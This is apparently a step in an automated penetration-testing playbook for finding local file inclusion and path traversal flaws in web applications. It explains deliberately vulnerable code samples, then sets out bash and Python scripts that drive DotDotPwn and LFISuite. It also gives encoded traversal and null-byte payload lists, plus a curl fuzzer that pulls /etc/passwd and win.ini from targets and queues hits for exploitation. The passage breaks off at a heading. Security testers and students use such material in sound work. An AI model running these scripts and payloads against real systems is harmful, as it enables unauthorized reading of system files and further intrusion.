================================================================================
TASK 72 ¬∑ LFI & PATH TRAVERSAL DETECTION
================================================================================
Covers testing_toolkit.txt Phase 9 Step 30 (Part 1)
Scanning for Local File Inclusion and path traversal vulnerabilities.

OBJECTIVE:
- Identify file/path parameters in URL corpus
- Fuzz with path traversal sequences (../, encoded variants)
- Detect readable system files (/etc/passwd, win.ini, etc.)
- Test PHP wrapper support (php://filter, data://, etc.)
- Build queue for exploitation in Task 73

================================================================================
INPUTS
================================================================================
outputs/queue_dynamic_endpoints_urls.txt   ‚Üê Parameterized URLs
outputs/url_corpus_all_in_scope.txt        ‚Üê Full URL corpus
outputs/live_base_urls.txt                 ‚Üê Live hosts
outputs/nuclei/tech_stack.json             ‚Üê Tech detection (PHP, Java, etc.)
outputs/waf_fingerprints.txt               ‚Üê WAF detection

================================================================================
OUTPUTS
================================================================================
outputs/lfi/
‚îú‚îÄ‚îÄ file_params_candidates.txt      ‚Üê URLs with file/path parameters
‚îú‚îÄ‚îÄ traversal_confirmed.txt         ‚Üê Confirmed path traversal
‚îú‚îÄ‚îÄ lfi_confirmed.txt               ‚Üê Confirmed LFI (file read)
‚îú‚îÄ‚îÄ wrapper_support.txt             ‚Üê PHP wrapper support detected
‚îú‚îÄ‚îÄ dotdotpwn_results.txt           ‚Üê DotDotPwn scan output
‚îú‚îÄ‚îÄ lfisuite_results.txt            ‚Üê LFISuite scan output
‚îî‚îÄ‚îÄ lfi_scan_log.txt                ‚Üê Full execution log

temp/agent1/queue_lfi_exploitation.txt     ‚Üê Queue for Task 73 exploitation

================================================================================
üß† LFI/PATH TRAVERSAL FUNDAMENTALS üß†
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
What is LFI?
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Local File Inclusion (LFI) occurs when an application includes files
based on user input without proper sanitization.

VULNERABLE CODE EXAMPLES:

PHP:
  include($_GET['page']);                    // Direct inclusion
  include($_GET['file'] . '.php');           // With extension
  include('pages/' . $_GET['template']);     // With prefix
  
Java:
  new FileInputStream(request.getParameter("file"));
  
Python:
  open(request.args.get('file')).read()
  
Node.js:
  fs.readFile(req.query.file, callback);

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Path Traversal vs LFI
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Vulnerability      ‚îÇ Impact                                                ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Path Traversal     ‚îÇ Read files outside web root (../../etc/passwd)       ‚îÇ
‚îÇ LFI                ‚îÇ Include files as code execution (PHP include)        ‚îÇ
‚îÇ LFI ‚Üí RCE          ‚îÇ Include log/session files with injected code         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

LFI is MORE DANGEROUS because included files can execute code!

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Common Vulnerable Parameters
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
FILE_PARAMS = [
    'file', 'path', 'page', 'template', 'include', 'inc',
    'document', 'doc', 'folder', 'root', 'pg', 'style',
    'pdf', 'img', 'image', 'filename', 'filepath', 'name',
    'cat', 'dir', 'action', 'board', 'date', 'detail',
    'download', 'prefix', 'include_path', 'loc', 'show',
    'site', 'type', 'view', 'content', 'layout', 'mod',
    'conf', 'config', 'lang', 'language', 'theme', 'skin'
]

================================================================================
PHASE 1: IDENTIFY FILE PARAMETERS
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.1 Extract URLs with File-like Parameters
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
mkdir -p outputs/lfi temp/agent1

# Search for file/path parameter patterns
grep -iE "[?&](file|path|page|template|include|doc|folder|pdf|img|filename|download|view|content|layout|lang|theme)=" \
    outputs/url_corpus_all_in_scope.txt \
    > temp/agent1/lfi_candidates_raw.txt

# Also check for file extensions in param values
grep -iE "[?&][a-z_]+=[^&]*(\.php|\.html|\.txt|\.xml|\.log|\.inc|\.tpl)" \
    outputs/url_corpus_all_in_scope.txt \
    >> temp/agent1/lfi_candidates_raw.txt

# Dedupe
sort -u temp/agent1/lfi_candidates_raw.txt > outputs/lfi/file_params_candidates.txt

echo "[*] Found $(wc -l < outputs/lfi/file_params_candidates.txt) URLs with file parameters"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.2 Smart Parameter Detection
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# detect_file_params.sh - Analyze param values for file-like patterns

while IFS= read -r url; do
    # Extract parameter values
    params=$(echo "$url" | grep -oP '[?&]\K[^=]+=[^&]+' || true)
    
    for param in $params; do
        name="${param%%=*}"
        value="${param#*=}"
        
        # Check if value looks like a file path
        if echo "$value" | grep -qiE '(\.php|\.html|\.txt|\.xml|/|\\|\.\.|\.\/)'; then
            echo "$url|$name|$value" >> temp/agent1/file_param_analysis.txt
        fi
        
        # Check if param name suggests file handling
        if echo "$name" | grep -qiE '(file|path|page|template|include|doc|load|read)'; then
            echo "$url|$name|$value" >> temp/agent1/file_param_analysis.txt
        fi
    done
done < outputs/url_corpus_all_in_scope.txt

sort -u temp/agent1/file_param_analysis.txt > outputs/lfi/file_params_candidates.txt

================================================================================
PHASE 2: DOTDOTPWN - PATH TRAVERSAL FUZZER
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.1 Install DotDotPwn
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# DotDotPwn is a Perl-based fuzzer
# Install via package manager or clone

# Kali/Debian:
# apt install dotdotpwn

# Or clone:
# git clone https://github.com/wireghoul/dotdotpwn.git
# cd dotdotpwn && cpan install Net::FTP HTTP::Lite Switch

# Verify installation
dotdotpwn.pl -h

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.2 DotDotPwn HTTP Mode
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Basic HTTP scan
dotdotpwn.pl -m http \
    -h TARGET_HOST \
    -x 80 \
    -f /etc/passwd \
    -k "root:" \
    -d 8 \
    -t 200 \
    -s \
    -q \
    -r outputs/lfi/dotdotpwn_results.txt

# OPTIONS:
# -m http        HTTP module
# -h HOST        Target hostname
# -x PORT        Target port
# -f FILE        File to retrieve (/etc/passwd)
# -k KEYWORD     Keyword to confirm success ("root:")
# -d DEPTH       Traversal depth (8 = ../../../../../../../../)
# -t TIMEOUT     Request timeout (ms)
# -s             Use SSL/TLS
# -q             Quiet mode
# -r FILE        Output report

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.3 DotDotPwn with Custom URL
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# For specific vulnerable parameter
dotdotpwn.pl -m http-url \
    -u "https://target.com/page.php?file=TRAVERSAL" \
    -k "root:" \
    -d 10 \
    -o unix \
    -r outputs/lfi/dotdotpwn_url_results.txt

# -m http-url    URL mode (TRAVERSAL = injection point)
# -o unix/windows   Target OS (affects payloads)

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.4 Batch Processing with DotDotPwn
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# dotdotpwn_batch.sh

while IFS='|' read -r url param value; do
    # Replace param value with TRAVERSAL marker
    test_url=$(echo "$url" | sed "s/$param=[^&]*/$param=TRAVERSAL/")
    
    echo "[*] Testing: $test_url"
    
    # Determine OS from tech stack
    if grep -qi "windows\|iis\|asp" outputs/nuclei/tech_stack.json 2>/dev/null; then
        target_os="windows"
        target_file="windows/win.ini"
        keyword="fonts"
    else
        target_os="unix"
        target_file="/etc/passwd"
        keyword="root:"
    fi
    
    timeout 120 dotdotpwn.pl -m http-url \
        -u "$test_url" \
        -k "$keyword" \
        -d 10 \
        -o "$target_os" \
        -q 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] VULNERABLE: $url ($param)"
        echo "$url|$param|dotdotpwn" >> outputs/lfi/traversal_confirmed.txt
    fi
    
done < outputs/lfi/file_params_candidates.txt

================================================================================
PHASE 3: LFISUITE - COMPREHENSIVE LFI SCANNER
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.1 Install LFISuite
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Clone LFISuite
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
pip install -r requirements.txt

# Verify
python lfisuite.py --help

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.2 LFISuite Scanner Mode
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Interactive mode (not ideal for automation)
# Use with expect script or pexpect

# Create target list for LFISuite
cat outputs/lfi/file_params_candidates.txt | cut -d'|' -f1 > temp/agent1/lfisuite_targets.txt

# LFISuite options:
# 1. Exploiter - exploit known LFI
# 2. Scanner - scan for LFI
# 3. Server - start reverse shell listener

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
3.3 Automated LFISuite Wrapper
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/usr/bin/env python3
# lfisuite_auto.py - Automated LFISuite wrapper

import subprocess
import sys
from pathlib import Path

def run_lfisuite(url, param):
    """Run LFISuite on a single URL"""
    
    # Build the vulnerable URL pattern
    # LFISuite expects: http://target.com/vuln.php?param=
    base_url = url.split('?')[0]
    vuln_url = f"{base_url}?{param}="
    
    try:
        # Use pexpect for interactive tool
        import pexpect
        
        child = pexpect.spawn('python lfisuite.py', timeout=60)
        child.expect('Choice:')
        child.sendline('2')  # Scanner mode
        
        child.expect('URL:')
        child.sendline(vuln_url)
        
        # Wait for results
        child.expect(pexpect.EOF, timeout=120)
        output = child.before.decode()
        
        if 'VULNERABLE' in output or 'root:' in output:
            return True, output
        return False, output
        
    except Exception as e:
        return False, str(e)

# Process targets
with open('outputs/lfi/file_params_candidates.txt') as f:
    for line in f:
        parts = line.strip().split('|')
        if len(parts) >= 2:
            url, param = parts[0], parts[1]
            vuln, output = run_lfisuite(url, param)
            
            if vuln:
                print(f"[+] VULNERABLE: {url}")
                with open('outputs/lfi/lfisuite_results.txt', 'a') as out:
                    out.write(f"{url}|{param}|lfisuite\n")

================================================================================
PHASE 4: MANUAL TRAVERSAL TESTING
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.1 Path Traversal Payloads
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# UNIX payloads
UNIX_TRAVERSAL=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "..%c0%af..%c0%af..%c0%afetc/passwd"
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
    "....\/....\/....\/etc/passwd"
    "..;/..;/..;/etc/passwd"
    "..//..//..//etc/passwd"
)

# Windows payloads
WINDOWS_TRAVERSAL=(
    "..\\..\\..\\windows\\win.ini"
    "..%5c..%5c..%5cwindows%5cwin.ini"
    "....\\\\....\\\\....\\\\windows\\win.ini"
    "..%255c..%255c..%255cwindows%255cwin.ini"
    "..%c0%5c..%c0%5c..%c0%5cwindows%5cwin.ini"
    "../../../windows/win.ini"
    "..%2f..%2f..%2fwindows%2fwin.ini"
)

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.2 Automated Traversal Fuzzer
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# traversal_fuzz.sh

# Payloads file
cat > temp/agent1/traversal_payloads.txt << 'EOF'
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
/etc/passwd
etc/passwd
/etc/passwd%00
../../../etc/passwd%00
../../../etc/passwd%00.php
..%00/..%00/..%00/etc/passwd
....//....//....//....//....//etc/passwd
..././..././..././etc/passwd
...\.....\.....\etc/passwd
..\/..\/..\/etc/passwd
\..\..\..\etc\passwd
../../../../../../../etc/passwd
..........//..........//etc/passwd
EOF

# Success indicators
UNIX_INDICATORS="root:|daemon:|bin:|sys:|sync:|games:|man:|lp:|mail:|news:|uucp:|proxy:|www-data:|backup:|list:|irc:|gnats:|nobody:|systemd-|_apt:|dbus:|polkitd:|sshd:|postfix:"

WINDOWS_INDICATORS="fonts|extensions|mci|files|Mail|drivers"

# Fuzz function
fuzz_url() {
    local url="$1"
    local param="$2"
    local base_url="${url%%\?*}"
    
    while IFS= read -r payload; do
        # URL encode if needed
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
        
        test_url="${base_url}?${param}=${payload}"
        
        response=$(curl -sk --max-time 10 "$test_url" 2>/dev/null)
        
        # Check for success indicators
        if echo "$response" | grep -qE "$UNIX_INDICATORS"; then
            echo "[+] LFI CONFIRMED (Unix): $test_url"
            echo "$url|$param|$payload|unix" >> outputs/lfi/traversal_confirmed.txt
            return 0
        fi
        
        if echo "$response" | grep -qE "$WINDOWS_INDICATORS"; then
            echo "[+] LFI CONFIRMED (Windows): $test_url"
            echo "$url|$param|$payload|windows" >> outputs/lfi/traversal_confirmed.txt
            return 0
        fi
        
    done < temp/agent1/traversal_payloads.txt
    
    return 1
}

# Process all candidates
while IFS='|' read -r url param value; do
    echo "[*] Testing: $url ($param)"
    fuzz_url "$url" "$param"
done < outputs/lfi/file_params_candidates.txt

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.3 Null Byte Bypass (PHP < 5.3.4)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# If application appends extension: include($_GET['file'] . '.php');
# Null byte truncates the extension

NULL_BYTE_PAYLOADS=(
    "../../../etc/passwd%00"
    "../../../etc/passwd%00.php"
    "../../../etc/passwd%00.html"
    "....//....//....//etc/passwd%00"
    "../../../etc/passwd\0"
    "../../../etc/passwd\x00"
)

# Test null byte bypass
for payload in "${NULL_BYTE_PAYLOADS[@]}"; do
    test_url="${base_url}?${param}=${payload}"
    response=$(curl -sk "$test_url")
    
    if echo "$response" | grep -q "root:"; then
        echo "[+] NULL BYTE BYPASS: $test_url"
    fi
done

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
4.4 Path Truncation (older PHP)
